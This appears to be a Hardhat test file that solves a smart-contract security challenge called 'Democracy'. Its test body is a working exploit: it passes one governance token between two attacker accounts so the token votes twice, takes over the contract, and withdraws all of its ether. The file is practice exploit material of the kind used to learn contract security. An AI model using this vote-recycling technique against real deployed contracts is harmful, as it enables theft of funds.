const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
      const [owner, attackerWallet] = await ethers.getSigners();
      const value = ethers.utils.parseEther("1");

      const VictimFactory = await ethers.getContractFactory(NAME);
      const victimContract = await VictimFactory.deploy({ value });

      return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
      let victimContract, attackerWallet;
      before(async function () {
          ({ victimContract, attackerWallet } = await loadFixture(setup));
      })

      it("conduct your attack here", async function () {
        const [, attacker1, attacker2] = await ethers.getSigners();

        // Nominate attacker as a challenger
        // After nominating the votes will be 5:3
        await victimContract.nominateChallenger(attacker1.address);

        // Transfer 1 token to the second account
        await victimContract.connect(attacker1).transferFrom(attacker1.address, attacker2.address, 1);

        // Vote with this token from the second account
        // After the voting the votes will be 5:4
        await victimContract.connect(attacker2).vote(attacker1.address);

        // Return the token 1 back to the first account to make a double voting
        await victimContract.connect(attacker2).transferFrom(attacker2.address, attacker1.address, 1);

        // Vote with 2 tokens from the first account
        // After the voting the votes will be 5:6
        await victimContract.connect(attacker1).vote(attacker1.address);

        // Withdraw the balance to the attacker account
        await victimContract.connect(attacker1).withdrawToAddress(attacker1.address);
      });

      after(async function () {
          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
          expect(victimContractBalance).to.be.equal('0');
      });
  });
});